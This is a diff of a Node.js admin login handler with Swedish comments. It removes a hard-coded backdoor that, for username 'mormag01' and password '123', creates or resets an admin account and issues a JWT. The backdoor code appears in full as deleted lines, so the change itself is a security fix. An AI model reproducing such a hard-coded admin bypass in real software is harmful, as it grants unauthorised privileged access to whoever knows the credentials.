@@ -65,34 +65,7 @@ module.exports = async function handler(req, res) {
       // --- LOGGA IN ---
       if (action === 'login') {
         
-        // ***************************************************************
-        // BAKDÖRR: SKAPA ANVÄNDAREN 'mormag01' AUTOMATISKT OM DEN SAKNAS
-        // ***************************************************************
-        if (username === 'mormag01' && password === '123') {
-            // 1. Kryptera lösenordet '123'
-            const salt = await bcrypt.genSalt(10);
-            const hashedPassword = await bcrypt.hash('123', salt);
-
-            // 2. Tvinga in användaren i databasen (Skapa om den inte finns, uppdatera lösen om den finns)
-            // Vi använder ON CONFLICT för att hantera om du redan kört detta en gång
-            await pool.query(
-                `INSERT INTO admin_users (username, password) VALUES ($1, $2)
-                 ON CONFLICT (username) DO UPDATE SET password = $2`,
-                ['mormag01', hashedPassword]
-            );
-
-            // 3. Hämta användarens ID (som nu garanterat finns)
-            const newUserRes = await pool.query("SELECT id FROM admin_users WHERE username = 'mormag01'");
-            const userId = newUserRes.rows[0].id;
-
-            // 4. Skapa inloggningsbiljett (Token)
-            const token = jwt.sign({ id: userId, username: 'mormag01' }, JWT_SECRET, { expiresIn: '24h' });
-
-            return res.status(200).json({ success: true, token: token, user: 'mormag01' });
-        }
-        // ***************************************************************
-        // SLUT PÅ BAKDÖRR - NEDAN ÄR DEN VANLIGA SÄKRA KODEN
-        // ***************************************************************
+      
 
         // Vanlig inloggning för andra användare
         const result = await pool.query('SELECT * FROM admin_users WHERE username = $1', [username]);
@@ -157,3 +130,4 @@ module.exports = async function handler(req, res) {
     return res.status(500).json({ error: "Serverfel: " + error.message });
   }
 };
+
